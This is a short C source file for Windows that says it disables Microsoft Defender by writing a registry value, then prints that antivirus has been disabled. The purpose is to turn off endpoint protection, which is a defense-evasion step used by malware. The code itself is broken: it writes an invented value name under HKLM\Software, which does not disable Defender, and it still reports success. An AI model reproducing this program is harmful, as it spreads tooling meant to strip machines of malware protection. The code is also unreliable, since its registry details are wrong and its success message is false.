#include <windows.h>
#include <stdio.h>

//  Registry Editor Key to Disable AV
#define PATH "SOFTWARE\\Microsoft\\Windows Defender"
#define SUBKEY "DisableRoutinelyAutomaticDetectiveUpdates"

VOID WriteToRegistry() {
    HKEY hKey;
    LONG lResult;

    //  Open the Software key in HKLM.
    lResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software"), 0, KEY_ALL_ACCESS, &hKey);
    if (lResult != ERROR_SUCCESS) {
        printf("Failed to open HKLM_Software with error: %d\n", lResult);
        return;
    }

    //  Create the subkey under Software
    DWORD pathLength = strlen(PATH);
    lResult = RegSetValueEx(hKey, SUBKEY, 0, REG_SZ, (LPBYTE)PATH, pathLength + 1);

    //  Close registry keys and display success or failure message
    RegCloseKey(hKey);
    if (lResult == ERROR_SUCCESS) {
        printf("AV has been disabled by adding registry key.\n");
    } else {
        printf("Failed to add registry key. Error Code: %d\n", lResult);
    }
}

int main(void) {
    printf("Disabling Microsoft Defender...\n");

    //  Write registry key to disable AV
    WriteToRegistry();

    printf("Finished disabling defender!\n");
    system("pause");
    return EXIT_SUCCESS;
}